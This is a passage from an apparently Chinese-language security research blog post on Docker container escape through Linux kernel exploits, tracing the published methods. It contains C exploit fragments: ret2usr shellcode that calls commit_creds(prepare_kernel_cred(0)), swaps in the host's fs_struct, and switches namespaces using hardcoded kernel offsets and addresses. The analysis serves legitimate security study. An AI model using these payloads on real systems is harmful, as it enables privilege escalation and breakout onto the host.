rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">mnt_namespace</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">mnt_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">pid_namespace</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">pid_ns_for_children</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">net</span><span class="token plain">       </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">net_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">time_namespace</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">time_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">time_namespace</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">time_ns_for_children</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">cgroup_namespace</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">cgroup_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">seccomp</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> mode</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">atomic_t</span><span class="token plain"> filter_count</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">seccomp_filter</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">filter</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" class="clean-btn" aria-label="切换自动换行" title="切换自动换行"><svg viewBox="0 0 24 24" class="wordWrapButtonIcon_Bwma" aria-hidden="true"><path fill="currentColor" d="M4 19h6v-2H4v2zM20 5H4v2h16V5zm-3 6H4v2h13.25c1.1 0 2 .9 2 2s-.9 2-2 2H15v-2l-3 3l3 3v-2h2c2.21 0 4-1.79 4-4s-1.79-4-4-4z"></path></svg></button><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>正常情况下，这些在内核中的数据是安全的，可以很好地实现容器间的隔离。但当存在可被用户态利用的内核漏洞时，通过更改结构体中数据或者替换掉结构体指针，就可以让一个Docker进程变成一个host进程，从而完成逃逸。</p>
<p>在利用内核漏洞进行Docker逃逸时，目前主要考虑突破 capability、namespace和seccomp 三种限制，所以后续内容只涉及这三个方面。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="四利用方法发展历史">四、利用方法发展历史<a href="https://tiangonglab.github.io/blog/tiangongarticle030#%E5%9B%9B%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%8F%91%E5%B1%95%E5%8E%86%E5%8F%B2" class="hash-link" aria-label="四、利用方法发展历史的直接链接" title="四、利用方法发展历史的直接链接">​</a></h2>
<p>从公开的文档来看，利用Linux内核漏洞进行Docker逃逸已经有几年的历史了，目前能看到的方法有三种：</p>
<table><thead><tr><th>时间</th><th>方法</th><th>条件</th></tr></thead><tbody><tr><td><a href="https://web.archive.org/web/20190411052819/https://capsule8.com/blog/practical-container-escape-exercise/" target="_blank" rel="noopener noreferrer">20190306</a></td><td>（ret2usr）改cred + 改<code>current→fs</code></td><td>可关闭SMEP</td></tr><tr><td><a href="https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation" target="_blank" rel="noopener noreferrer">20190304</a>/<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf" target="_blank" rel="noopener noreferrer">20190808</a></td><td>（ret2usr）改cred + 切namespace + setns()</td><td>可关闭SMEP，有CAP_SYS_ADMIN</td></tr><tr><td><a href="https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/writeup.md#escaping-the-container-and-popping-a-root-shell" target="_blank" rel="noopener noreferrer">20210707</a></td><td>（kernel ROP）改cred + 切namespace  + 用户态setns()</td><td>有CAP_SYS_ADMIN</td></tr></tbody></table>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="41-改进程fs_struct">4.1 改进程fs_struct<a href="https://tiangonglab.github.io/blog/tiangongarticle030#41-%E6%94%B9%E8%BF%9B%E7%A8%8Bfs_struct" class="hash-link" aria-label="4.1 改进程fs_struct的直接链接" title="4.1 改进程fs_struct的直接链接">​</a></h3>
<p>最初的逃逸方案是基于SMEP已关闭的前提下，ret2usr后：</p>
<ul>
<li><code>commit_creds(prepare_kernel_cred(0))</code>提权 —— 改了进程的capability</li>
<li><code>copy_fs_struct()</code> —— 将host中pid为1的进程其 task_struct-&gt;fs 复制一份</li>
<li>用上一步的返回值替换 <code>current-&gt;fs</code> —— 更改文件系统</li>
</ul>
<p>ret2usr后利用代码片段：</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token class-name">uint64_t</span><span class="token plain"> pid_offset_ </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0x9c0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token class-name">uint64_t</span><span class="token plain"> parent_offset_ </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0x9d0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token class-name">uint64_t</span><span class="token plain"> fs_offset_ </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0xbf8</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 需要task_struct中关键成员的偏移值</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token class-name">uint64_t</span><span class="token plain"> userpid </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">34</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">static</span><span class="token plain"> </span><span class="token class-name">ssize_t</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">set_fs_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">void</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">task_struct</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">task_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">task_struct</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">init_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">uint32_t</span><span class="token plain"> pid_ </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">void</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain"> userkpid </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">find_get_pid</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">userpid</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 需要Docker中进程的pid</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    task_ </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">pid_task</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">userkpid</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain">PIDTYPE_PID</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    init_ </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> task_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">         </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 需要循环搜索</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">while</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">pid_ </span><span class="token operator" style="color: rgb(57, 58, 52);">!=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">1</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain">        </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        init_ </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">task_struct</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">char</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain">init_ </span><span class="token operator" style="color: rgb(57, 58, 52);">+</span><span class="token plain"> parent_offset_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        pid_ </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token class-name">uint32_t</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">char</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain">init_ </span><span class="token operator" style="color: rgb(57, 58, 52);">+</span><span class="token plain"> pid_offset_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">uint64_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">copy_fs_struct</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token class-name">uint64_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0xFFFFFFFF813D2F20</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">       </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 需要几个关键函数的地址</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">uint64_t</span><span class="token plain"> g </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">copy_fs_struct</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token class-name">uint64_t</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">char</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain">init_ </span><span class="token operator" style="color: rgb(57, 58, 52);">+</span><span class="token plain"> fs_offset_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token class-name">uint64_t</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">char</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain">task_ </span><span class="token operator" style="color: rgb(57, 58, 52);">+</span><span class="token plain"> fs_offset_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> g</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">   </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">return</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">void</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">shellcode</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">commit_creds</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token function" style="color: rgb(215, 58, 73);">prepare_kernel_cred</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">set_fs_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" class="clean-btn" aria-label="切换自动换行" title="切换自动换行"><svg viewBox="0 0 24 24" class="wordWrapButtonIcon_Bwma" aria-hidden="true"><path fill="currentColor" d="M4 19h6v-2H4v2zM20 5H4v2h16V5zm-3 6H4v2h13.25c1.1 0 2 .9 2 2s-.9 2-2 2H15v-2l-3 3l3 3v-2h2c2.21 0 4-1.79 4-4s-1.79-4-4-4z"></path></svg></button><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>该方法可以让Docker进程能够以host的root权限任意读写host文件系统，但是无法kill进程，如下图：</p>
<p><img decoding="async" loading="lazy" src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/62998bd5-0e9d-4ea1-8d4a-fbedbe282f45-bef5348539bbb67a87a782e275f3538a.png" width="1920" height="255" class="img_ev3q"></p>
<p>因为只替换了文件系统，并未改变任何namespace。</p>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="42-改capns-v10">4.2 改cap+ns v1.0<a href="https://tiangonglab.github.io/blog/tiangongarticle030#42-%E6%94%B9capns-v10" class="hash-link" aria-label="4.2 改cap+ns v1.0的直接链接" title="4.2 改cap+ns v1.0的直接链接">​</a></h3>
<p>上一种方法仅达成了读写host文件系统的能力，而Docker中的进程其namespace还在Docker中，不算是完美的逃逸，于是紧接着出现了第二种可以逃逸namespace的方法。</p>
<p>这个方法也是基于关闭SMEP的前提条件下，ret2usr执行提权和切namespace的操作。主要思路是：</p>
<ul>
<li><code>commit_creds(prepare_kernel_cred(0))</code>提权 —— 改了进程的capability</li>
<li><code>switch_task_namespaces()</code> —— 替换Docker中pid为1进程的namespace</li>
<li><code>setns()</code> —— 将当前进程加入到<code>/proc</code> 目录下pid为1进程的namespace中</li>
</ul>
<p>ret2usr后利用代码片段：</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token keyword" style="color: rgb(0, 0, 159);">static</span><span class="token plain"> </span><span class="token class-name">ssize_t</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">sw_ns_set_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">void</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">find_task_by_vpid</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0xFFFFFFFF810E6500</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 需要几个关键函数/数据的地址</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">size_t</span><span class="token plain"> g </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">find_task_by_vpid</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token number" style="color: rgb(54, 172, 170);">1</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">size_t</span><span class="token plain"> init_nsproxy </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0xFFFFFFFF82E8B000</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">switch_task_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0xFFFFFFFF810EECB0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">switch_task_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">g</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> init_nsproxy</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"> </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">sys_open_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0xFFFFFFFF81389980</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"> </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">sys_setns_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 